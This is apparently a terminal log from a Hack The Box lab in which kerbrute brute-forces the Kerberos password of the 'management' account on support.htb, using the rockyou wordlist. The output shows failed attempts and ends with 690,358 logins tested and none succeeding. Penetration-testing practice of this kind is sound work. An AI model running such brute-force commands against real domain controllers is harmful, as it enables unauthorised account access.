kerbrute bruteuser --dc 10.10.11.174 -d support.htb /usr/share/wordlists/rockyou.txt management

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/09/22 - Ronnie Flathers @ropnop

2022/10/09 10:24:04 >  Using KDC(s):
2022/10/09 10:24:04 >   10.10.11.174:88

  























2022/10/09 16:03:07 >  [!] management@support.htb:ben1010 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:03:07 >  [!] management@support.htb:ben001 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:03:07 >  [!] management@support.htb:ben08 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                              
2022/10/09 16:03:07 >  [!] management@support.htb:bemine23 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                           
2022/10/09 16:03:07 >  [!] management@support.htb:bemine20 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                           
2022/10/09 16:03:07 >  [!] management@support.htb:bemis - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                              
2022/10/09 16:03:07 >  [!] management@support.htb:bemskie - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:03:07 >  [!] management@support.htb:bemmel - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:03:07 >  [!] management@support.htb:bemine5 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:03:07 >  [!] management@support.htb:bemine3 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:05:22 >  [!] management@support.htb:bemine! - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:05:22 >  [!] management@support.htb:belvita - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:05:22 >  [!] management@support.htb:belzebu - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:05:22 >  [!] management@support.htb:belynha - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:05:22 >  [!] management@support.htb:bembos - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] management@support.htb:bembie - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] management@support.htb:beme06 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] management@support.htb:bembii - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] management@support.htb:beluxa - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] management@support.htb:bembe8 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:07:37 >  [!] management@support.htb:belucha - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                            
2022/10/09 16:07:37 >  Done! Tested 690358 logins (0 successes) in 20613.666 seconds
